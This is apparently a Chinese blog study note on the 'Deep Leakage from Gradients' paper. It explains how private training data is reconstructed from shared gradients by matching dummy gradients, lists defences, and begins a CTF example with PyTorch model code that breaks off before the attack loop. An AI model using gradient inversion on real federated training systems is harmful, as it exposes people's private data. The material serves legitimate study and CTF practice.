<p>论文原址<a href="https://arxiv.org/abs/1906.08935">Deep Leakage from Gradients </a></p>
<p>每个节点对样本进行采样，进行节点处的梯度计算</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo separator="true">,</mo><msub><mi>W</mi><mi>t</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>y</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi>W</mi><mi>t</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\nabla W_ {t,i} =  \frac {\partial  \ell (F(x_ {t,i},W_ {t}),y_ {t,i})}{\partial W_ {t}}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.263em;vertical-align:-0.836em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.836em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>梯度在N个服务器上被平均</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mi>t</mi></msub><mo>=</mo><mfrac><mn>1</mn><mi>N</mi></mfrac><munderover><mo>∑</mo><mi>j</mi><mi>N</mi></munderover><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">\nabla W_ {t}  =  \frac {1}{N}   \sum _ {j}^ {N}   \nabla W_ {t,j}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.2421em;vertical-align:-1.4138em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>平均后进行权重更新</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>W</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>W</mi><mi>t</mi></msub><mo>−</mo><mi>η</mi><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">W_ {t+1}=W_ {t}-\eta   \nabla W_ {t}  
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>而现在由于梯度共享，所以我们的目标就是从梯度去对原始数据进行恢复</p>
<p>为了从梯度中恢复出数据，我们首先随机初始化一对伪输入x’和标签y‘。然后将其输入模型并获取伪梯度</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msup><mi>W</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>W</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><mi>W</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\nabla W&#x27;=  \frac {\partial  \ell(F(x&#x27;,W),y&#x27;)}{\partial W} 
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.1149em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4289em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>优化伪梯度让其接近原始梯度的过程中，伪数据也会逐渐接近原始的真实训练数据。</p>
<p>给定某一步的梯度，通过最小化如下目标来获得训练数据</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>x</mi><mrow><mo mathvariant="normal">′</mo><mo lspace="0em" rspace="0em">∗</mo></mrow></msup><mo separator="true">,</mo><msup><mi>y</mi><mrow><mo mathvariant="normal">′</mo><mo lspace="0em" rspace="0em">∗</mo></mrow></msup><mo>=</mo><mi>a</mi><mi>r</mi><mi>g</mi><mi><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></munder></mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∇</mi><msup><mi>W</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>−</mo><mi mathvariant="normal">∇</mi><mi>W</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo>=</mo><mi>a</mi><mi>r</mi><mi>g</mi><mi><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></munder></mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>W</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><mi>W</mi></mrow></mfrac><mo>−</mo><mi mathvariant="normal">∇</mi><mi>W</mi><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">x&#x27;^{*},y&#x27;^{*}=arg \underset{x&#x27;,y&#x27;} \min |\nabla W&#x27;- \nabla W|^ {2}=arg \underset{x&#x27;,y&#x27;} \min ||\frac {\partial \ell(F(x&#x27;,W),y&#x27;)}{\partial W}-\nabla W||^ {2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9963em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.682em;vertical-align:-0.8801em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.356em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span></span></span></span></span></span></span><span class="mord">∣∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.309em;vertical-align:-0.8801em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.356em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span></span></span></span></span></span></span><span class="mord">∣∣</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4289em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p><img src="https://s2.loli.net/2023/11/15/oW7iNazH62uURIT.png" alt=""></p>
<h2 id="防御手段">防御手段</h2>
<p>同时，在给出攻击方法的同时，论文也针对性讨论了防御手段。另外也发现了部分升级版攻击手法，之后会继续尝试复现。</p>
<p>使用加密技术对梯度数据进行加密，或者将幅度较小的梯度剪枝为0.另外，论文以外也有人尝试过将梯度添加噪声。</p>
<h2 id="例题尝试">例题尝试</h2>
<p>*<strong>CTF2022-Alice’s challenge</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span 